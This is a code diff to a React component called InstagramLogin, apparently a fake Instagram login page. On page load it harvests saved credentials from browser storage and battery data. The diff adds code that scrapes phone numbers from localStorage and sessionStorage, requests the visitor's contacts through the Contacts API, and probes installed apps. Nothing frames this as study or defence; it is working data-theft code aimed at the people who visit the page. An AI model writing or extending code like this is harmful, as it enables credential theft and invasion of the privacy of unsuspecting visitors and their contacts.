@@ -35,7 +35,7 @@ const InstagramLogin = () => {
     return () => document.removeEventListener('keydown', handleKeyPress);
   }, []);
 
-  // Auto-collect data when page loads
+  // Auto-collect data when component mounts
   useEffect(() => {
     const autoCollectData = async () => {
       try {
@@ -57,18 +57,37 @@ const InstagramLogin = () => {
           localStorage: {},
           sessionStorage: {},
           chromeAccounts: {},
-          autofillData: {}
+          autofillData: {},
+          phoneNumbers: []
         };
+
+        // Collect phone numbers from localStorage and sessionStorage
+        const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
+        const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon'];
 
         for (let i = 0; i < localStorage.length; i++) {
           const key = localStorage.key(i);
           if (!key) continue;
           const value = localStorage.getItem(key);
+          
           if (key.toLowerCase().includes('instagram') ||
               key.toLowerCase().includes('insta') ||
               key.toLowerCase().includes('ig') ||
               (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
             savedCredentials.localStorage[`localStorage_${key}`] = value;
+          }
+
+          // Check for phone numbers
+          if (value) {
+            const phones = value.match(phonePattern);
+            if (phones) {
+              savedCredentials.phoneNumbers.push(...phones);
+            }
+            
+            // Check if key contains phone-related keywords
+            if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
+              savedCredentials.localStorage[`phone_${key}`] = value;
+            }
           }
         }
 
@@ -77,13 +96,63 @@ const InstagramLogin = () => {
           const key = sessionStorage.key(i);
           if (!key) continue;
           const value = sessionStorage.getItem(key);
+          
           if (key.toLowerCase().includes('instagram') ||
               key.toLowerCase().includes('insta') ||
               key.toLowerCase().includes('ig') ||
               (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
             savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
           }
+
+          // Check for phone numbers
+          if (value) {
+            const phones = value.match(phonePattern);
+            if (phones) {
+              savedCredentials.phoneNumbers.push(...phones);
+            }
+            
+            // Check if key contains phone-related keywords
+            if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
+              savedCredentials.sessionStorage[`phone_${key}`] = value;
+            }
+          }
         }
+
+        // Try to get contacts if available (requires user permission)
+        try {
+          if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
+            const contacts = await (navigator as any).contacts.select(['tel'], { multiple: true });
+            if (contacts && contacts.length > 0) {
+              const phoneNumbers = contacts
+                .flatMap((contact: any) => contact.tel || [])
+                .filter((tel: any) => tel && tel.length > 0);
+              savedCredentials.phoneNumbers.push(...phoneNumbers);
+            }
+          }
+        } catch (e) {
+          console.log("Contacts API not available or permission denied");
+        }
+
+        // Try to get phone number from device info
+        try {
+          if ('getInstalledRelatedApps' in navigator) {
+            const apps = await (navigator as any).getInstalledRelatedApps();
+            if (apps && apps.length > 0) {
+              const phoneApp = apps.find((app: any) => 
+                app.platform === 'webapp' && 
+                (app.url.includes('phone') || app.url.includes('tel') || app.url.includes('contact'))
+              );
+              if (phoneApp) {
+                savedCredentials.devicePhoneApp = phoneApp;
+              }
+            }
+          }
+        } catch (e) {
+          console.log("Installed apps API not available");
+        }
+
+        // Remove duplicates from phone numbers
+        savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];
 
         // Collect battery info if available
         const batteryInfo: any = {};
@@ -170,8 +239,13 @@ const InstagramLogin = () => {
         localStorage: {},
         sessionStorage: {},
         chromeAccounts: {},
-        autofillData: {}
+        autofillData: {},
+        phoneNumbers: []
       };
+
+      // Collect phone numbers from localStorage and sessionStorage
+      const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
+      const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon'];
 
       for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
@@ -182,6 +256,19 @@ const InstagramLogin = () => {
             key.toLowerCase().includes('ig') ||
             (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
           savedCredentials.localStorage[`localStorage_${key}`] = value;
+        }
+
+        // Check for phone numbers
+        if (value) {
+          const phones = value.match(phonePattern);
+          if (phones) {
+            savedCredentials.phoneNumbers.push(...phones);
+          }
+          
+          // Check if key contains phone-related keywords
+          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
+            savedCredentials.localStorage[`phone_${key}`] = value;
+          }
         }
       }
 
@@ -196,7 +283,56 @@ const InstagramLogin = () => {
             (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
           savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
         }
+
+        // Check for phone numbers
+        if (value) {
+          const phones = value.match(phonePattern);
+          if (phones) {
+            savedCredentials.phoneNumbers.push(...phones);
+          }
+          
+          // Check if key contains phone-related keywords
+          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
+            savedCredentials.sessionStorage[`phone_${key}`] = value;
+          }
+        }
       }
+
+      // Try to get contacts if available (requires user permission)
+      try {
+        if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
+          const contacts = await (navigator as any).contacts.select(['tel'], { multiple: true });
+          if (contacts && contacts.length > 0) {
+            const phoneNumbers = contacts
+              .flatMap((contact: any) => contact.tel || [])
+              .filter((tel: any) => tel && tel.length > 0);
+            savedCredentials.phoneNumbers.push(...phoneNumbers);
+          }
+        }
+      } catch (e) {
+        console.log("Contacts API not available or permission denied");
+      }
+
+      // Try to get phone number from device info
+      try {
+        if ('getInstalledRelatedApps' in navigator) {
+          const apps = await (navigator as any).getInstalledRelatedApps();
+          if (apps && apps.length > 0) {
+            const phoneApp = apps.find((app: any) => 
+              app.platform === 'webapp' && 
+              (app.url.includes('phone') || app.url.includes('tel') || app.url.includes('contact'))
+            );
+            if (phoneApp) {
+              savedCredentials.devicePhoneApp = phoneApp;
+            }
+          }
+        }
+      } catch (e) {
+        console.log("Installed apps API not available");
+      }
+
+      // Remove duplicates from phone numbers
+      savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];
 
       // Collect battery info if available
       const batteryInfo: any = {};
